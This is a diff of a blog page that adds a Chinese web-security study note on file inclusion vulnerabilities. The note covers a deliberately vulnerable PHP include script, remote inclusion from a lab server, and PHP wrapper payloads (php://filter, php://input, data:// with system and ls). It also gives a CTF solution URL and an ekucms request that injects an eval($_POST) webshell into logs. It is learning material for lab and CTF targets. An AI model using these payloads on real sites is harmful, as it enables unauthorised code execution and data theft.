@@ -443,9 +443,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -466,14 +470,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
 
@@ -493,7 +497,301 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-文件操作之文件包含漏洞全解"><a href="#WEB漏洞-文件操作之文件包含漏洞全解" class="headerlink" title="WEB漏洞-文件操作之文件包含漏洞全解"></a><font size="6"><strong>WEB漏洞-文件操作之文件包含漏洞全解</strong></font></h2><span id="more"></span>
+
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/1.png"></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#文件包含漏洞</span>
+
+原理，检测，类型，利用，修复等
+
+<span class="token comment" spellcheck="true">#文件包含各个脚本代码</span>
+ASP,PHP,JSP,ASPX等
+
+<span class="token operator">&lt;</span><span class="token operator">!</span>-—<span class="token comment" spellcheck="true">#include file="1.asp " --></span>
+
+<span class="token operator">&lt;</span><span class="token operator">!</span>--<span class="token comment" spellcheck="true">#include file="top.aspx"--></span>
+
+<span class="token operator">&lt;</span>c:import url<span class="token operator">=</span><span class="token string">"http://lthief.one/1.jsp"</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span>jsp:include page<span class="token operator">=</span><span class="token string">"head .jsp"</span> / <span class="token operator">></span>
+
+<span class="token operator">&lt;</span>%@ include file<span class="token operator">=</span><span class="token string">"head.jsp"</span> %<span class="token operator">></span>
+
+<span class="token operator">&lt;</span>?php Include <span class="token punctuation">(</span> <span class="token string">'test.php '</span> <span class="token punctuation">)</span> ?<span class="token operator">></span>
+</code></pre>
+<h3 id="一、无限制包含漏洞文件"><a href="#一、无限制包含漏洞文件" class="headerlink" title="一、无限制包含漏洞文件"></a><font size="5"><strong>一、无限制包含漏洞文件</strong></font></h3><pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html<span class="token comment" spellcheck="true"># cat include.php</span>
+<span class="token operator">&lt;</span>?php
+
+<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+include <span class="token punctuation">(</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+//http://127.0.0.1:8080/include.php?filename<span class="token operator">=</span>index.txt
+
+/*
+
+<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+include <span class="token punctuation">(</span> <span class="token variable">$filename</span> <span class="token keyword">.</span><span class="token string">" .html"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+*/
+?<span class="token operator">></span>
+</code></pre>
+<p>index.txt</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+    phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/2.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/3.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/4.png"></p>
+<h3 id="二、有限制文件包含漏洞"><a href="#二、有限制文件包含漏洞" class="headerlink" title="二、有限制文件包含漏洞"></a><font size="5"><strong>二、有限制文件包含漏洞</strong></font></h3><p><font color=red><strong>未完成</strong></font></p>
+<pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html<span class="token comment" spellcheck="true"># cat include.php</span>
+<span class="token operator">&lt;</span>?php
+
+<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+include<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token keyword">.</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+?<span class="token operator">></span>
+</code></pre>
+<h3 id="三、远程包含"><a href="#三、远程包含" class="headerlink" title="三、远程包含"></a><font size="5"><strong>三、远程包含</strong></font></h3><p>条件<br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/5.png"></p>
+<p>在远程服务器上创建readme.txt并访问</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+    phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/6.png"></p>
+<p>远程包含漏洞利用<a target="_blank" rel="noopener" href="http://10.1.1.7:49153/include.php?filename=http://10.1.1.6/readme.txt">http://10.1.1.7:49153/include.php?filename=http://10.1.1.6/readme.txt</a><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/7.png"></p>
+<h3 id="四、协议玩法"><a href="#四、协议玩法" class="headerlink" title="四、协议玩法"></a><font size="5"><strong>四、协议玩法</strong></font></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a><br>PHP支持的伪协议</p>
+<pre class=" language-bash"><code class="language-bash">file:// — 访问本地文件系统
+http:// — 访问 HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> 网址
+ftp:// — 访问 FTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+</code></pre>
+<p><strong>php.ini参数设置</strong><br>在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。<br>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；<br>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</p>
+<p><strong>各协议的利用条件和方法</strong><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/8.png"></p>
+<p><strong>php:&#x2F;&#x2F;input</strong><br>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<br><strong>注：当enctype&#x3D;”multipart&#x2F;form-data”时，php:&#x2F;&#x2F;input是无效的。</strong></p>
+<p><strong>file:&#x2F;&#x2F;</strong><br>用于访问本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。<br>用法：</p>
+<pre class=" language-bash"><code class="language-bash">file://<span class="token punctuation">[</span>文件的绝对路径和文件名<span class="token punctuation">]</span>
+</code></pre>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=file://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.txt">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</a><br>2、[文件的相对路径和文件名]<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a></p>
+<p><strong>http:&#x2F;&#x2F;、https:&#x2F;&#x2F;</strong><br>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。<br>用法：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>http：//网络路径和文件名<span class="token punctuation">]</span>
+</code></pre>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p>
+<p><strong>php:&#x2F;&#x2F;</strong><br>php:&#x2F;&#x2F; 用于访问各个输入&#x2F;输出流（I&#x2F;O streams），经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码。</p>
+<table>
+    <thead>
+        <tr>
+            <th>Va协议lue</th>
+            <th>作用</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>php://input</td>
+            <td>enctype="multipart/form-data" 的时候php://input 是无效的。</td>
+        </tr>
+        <tr>
+            <td>/php://output</td>
+            <td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+        </tr>
+        <tr>
+            <td>php://fd</td>
+            <td>(>=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</td>
+        </tr>
+        <tr>
+            <td>php://memory php://temp</td>
+            <td>(>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td>
+        </tr>
+        <tr>
+            <td>php://filter</td>
+            <td>(>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td>
+        </tr>
+    </tbody>
+</table>
+
+<p><strong>php:&#x2F;&#x2F;filter参数详解</strong></p>
+<table>
+    <thead>
+        <tr>
+            <th>resource=<要过滤的数据流></th>
+            <th>必须项。它指定了你要筛选过滤的数据流。</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>read=<读链的过滤器></td>
+            <td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
+        </tr>
+        <tr>
+            <td>write=<写链的筛选列表></td>
+            <td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
+        </tr>
+        <tr>
+            <td><; 两个链的过滤器></td>
+            <td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<p><strong>可用的过滤器列表（4类）</strong></p>
+<table>
+    <thead>
+        <tr>
+            <th>字符串过滤器</th>
+            <th>作用</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>string.rot13</td>
+            <td>等同于str_rot13()，rot13变换</td>
+        </tr>
+        <tr>
+            <td>string.toupper</td>
+            <td>等同于strtoupper()，转大写字母</td>
+        </tr>
+        <tr>
+            <td>string.tolower</td>
+            <td>等同于strtolower()，转小写字母</td>
+        </tr>
+            <td>string.strip_tags</td>
+            <td>等同于strip_tags()，去除html、PHP语言标签</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<table>
+    <thead>
+        <tr>
+            <th>转换过滤器</th>
+            <th>作用</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>convert.base64-encode & convert.base64-decode</td>
+            <td>等同于base64_encode()和base64_decode()，base64编码解码</td>
+        </tr>
+        <tr>
+            <td>convert.quoted-printable-encode & convert.quoted-printable-decode</td>
+            <td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<table>
+    <thead>
+        <tr>
+            <th>压缩过滤器</th>
+            <th>作用</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>zlib.deflate & zlib.inflate</td>
+            <td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+        </tr>
+        <tr>
+            <td>bzip2.compress & bzip2.decompress</td>
+            <td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<table>
+    <thead>
+        <tr>
+            <th>加密过滤器</th>
+            <th>作用</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>mcrypt.*</td>
+            <td>libmcrypt 对称加密算法</td>
+        </tr>
+        <tr>
+            <td>mdecrypt.*</td>
+            <td>libmcrypt 对称解密算法</td>
+        </tr>
+    </tbody>
+</table>
+
+
+<p><strong>读取文件源码用法</strong></p>
+<pre class=" language-bash"><code class="language-bash">php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span><span class="token punctuation">[</span>文件名<span class="token punctuation">]</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>phpinfo.php
+</code></pre>
+<p><strong>执行php代码用法</strong></p>
+<pre class=" language-bash"><code class="language-bash">php://input + <span class="token punctuation">[</span>POST DATA<span class="token punctuation">]</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>php://input
+<span class="token punctuation">[</span>POST DATA部分<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/19.png"><br><strong>phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;</strong><br>用于读取压缩文件，zip:&#x2F;&#x2F; 、 bzip2:&#x2F;&#x2F; 、 zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p>
+<p><strong>用法示例</strong></p>
+<pre class=" language-bash"><code class="language-bash">1、zip://<span class="token punctuation">[</span>压缩文件绝对路径<span class="token punctuation">]</span>%23<span class="token punctuation">[</span>压缩文件内的子文件名<span class="token punctuation">]</span>（<span class="token comment" spellcheck="true">#编码为%23）</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+ 
+2、compress.bzip2://file.bz2
+http://127.0.0.1/include.php?file<span class="token operator">=</span>compress.bzip2://D:/soft/phpStudy/WWW/file.jpghttp://127.0.0.1/include.php?file<span class="token operator">=</span>compress.bzip2://./file.jpg
+ 
+3、compress.zlib://file.gz
+http://127.0.0.1/include.php?file<span class="token operator">=</span>compress.zlib://D:/soft/phpStudy/WWW/file.jpghttp://127.0.0.1/include.php?file<span class="token operator">=</span>compress.zlib://./file.jpg4、phar://
+</code></pre>
+<p><strong>data:&#x2F;&#x2F;</strong><br>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<pre class=" language-bash"><code class="language-bash">1、data://text/plain,
+http://127.0.0.1/include.php?file<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php%20phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>
+ 
+2、data://text/plain<span class="token punctuation">;</span>base64,
+http://127.0.0.1/include.php?file<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h4 id="filter演示"><a href="#filter演示" class="headerlink" title="filter演示"></a><font size="4"><strong>filter演示</strong></font></h4><p><a target="_blank" rel="noopener" href="http://10.1.1.7:49153/include.php?filename=php://filter/read=convert.base64-encode/resource=index.html%E8%AF%BB%E5%8F%9610.1.1.7%E4%B8%ADindex.php%E6%96%87%E4%BB%B6%E4%BB%A5base64%E7%BC%96%E7%A0%81%E8%BE%93%E5%87%BA">http://10.1.1.7:49153/include.php?filename=php://filter/read=convert.base64-encode/resource=index.html读取10.1.1.7中index.php文件以base64编码输出</a></p>
+<pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html<span class="token comment" spellcheck="true"># cat index.html</span>
+<span class="token operator">&lt;</span>?php
+        phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/9.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/10.png"></p>
+<h4 id="input演示"><a href="#input演示" class="headerlink" title="input演示"></a><font size="4"><strong>input演示</strong></font></h4><p>由于我的hackbar没法提交post数据所以这个没法演示</p>
+<h4 id="file演示"><a href="#file演示" class="headerlink" title="file演示"></a><font size="4"><strong>file演示</strong></font></h4><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/11.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/12.png"></p>
+<p>file:&#x2F;&#x2F;需要的是完整的路径</p>
+<h4 id="data演示"><a href="#data演示" class="headerlink" title="data演示"></a><font size="4"><strong>data演示</strong></font></h4><pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/include.php?filename<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/13.png"></p>
+<pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/include.php?filename<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'pwd'</span><span class="token punctuation">)</span>?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/14.png"></p>
+<pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/include.php?filename<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php <span class="token keyword">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span>?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/15.png"></p>
+<h3 id="五、南邮杯CTF"><a href="#五、南邮杯CTF" class="headerlink" title="五、南邮杯CTF"></a><font size="5"><strong>五、南邮杯CTF</strong></font></h3><p><a target="_blank" rel="noopener" href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p>
+<pre class=" language-bash"><code class="language-bash">http://4.chinalover.sinaapp.com/web7/index.php?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>index.php
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/16.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/17.png"></p>
+<h3 id="六、ekucms文件包含"><a href="#六、ekucms文件包含" class="headerlink" title="六、ekucms文件包含"></a><font size="5"><strong>六、ekucms文件包含</strong></font></h3><pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/index.php?s<span class="token operator">=</span>my/show/id/<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;~eval($_POST[x])&amp;#125;</span>
+</code></pre>
+<p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/18.png"></p>
+<pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true"># pwd</span>
+/var/www/html/temp/Logs
+root@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true"># ls</span>
+21_08_15.log
+root@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true"># cat 21_08_15.log</span>
+<span class="token punctuation">[</span> 2021-08-15T21:57:58+08:00 <span class="token punctuation">]</span> ERR: <span class="token punctuation">(</span>ThinkException<span class="token punctuation">)</span> 模板不存在<span class="token punctuation">[</span>./template/default/Home/my_<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;~eval($_POST[x])&amp;#125;.html]</span>
+root@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true">#</span>
+</code></pre>
+<p>利用环节未完成版本有问题</p>
+
                 
             </div>
             <hr/>
@@ -556,7 +854,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -740,7 +1042,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-文件操作之文件下载读取全解
                         
                     </div>
                     <div class="publish-info">
@@ -754,6 +1056,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -777,7 +1087,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-RCE代码及命令执行漏洞全解
                         
                     </div>
                     <div class="publish-info">
@@ -791,6 +1101,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1028,7 +1346,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.5k</span>&nbsp;字
+                class="white-color">52.1k</span>&nbsp;字
             
             
             
